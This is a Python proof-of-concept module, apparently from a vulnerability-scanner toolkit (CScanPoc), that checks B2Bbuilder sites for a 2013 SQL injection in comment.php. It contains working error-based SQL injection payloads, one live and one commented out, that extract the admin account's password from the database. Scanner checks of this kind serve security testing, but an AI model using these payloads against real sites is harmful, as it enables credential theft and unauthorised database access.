# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'B2Bbuilder_0003'  # 平台漏洞编号，留空
    name = 'B2Bbuilder SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-10-03'  # 漏洞公布时间
    desc = '''
        B2Bbuilder 存在SQL注入漏洞，可爆出数据库账号和密码。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/772/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'B2Bbuilder'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '02f96761-bf55-4fcb-a4d7-25477d869722'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 爆密码:
            #payload = "/comment.php?ctype=2&conid=16873 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,unhex(Hex(cast(b2bbuilder_admin.password as char))),0x27,0x7e) from `b2bbuilder`.b2bbuilder_admin Order by user limit 1,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1"

            # 爆账号:
            payload = "/comment.php?ctype=2&conid=16873%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(md5(c),0x3A,password)%20from%20b2bbuilder_admin%20Order%20by%20user%20limit%200,1)%20)%20from%20`information_schema`.tables%20limit%200,1),floor(rand(0)*2))x%20from%20`information_schema`.tables%20group%20by%20x)a)%20and%201=1"
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
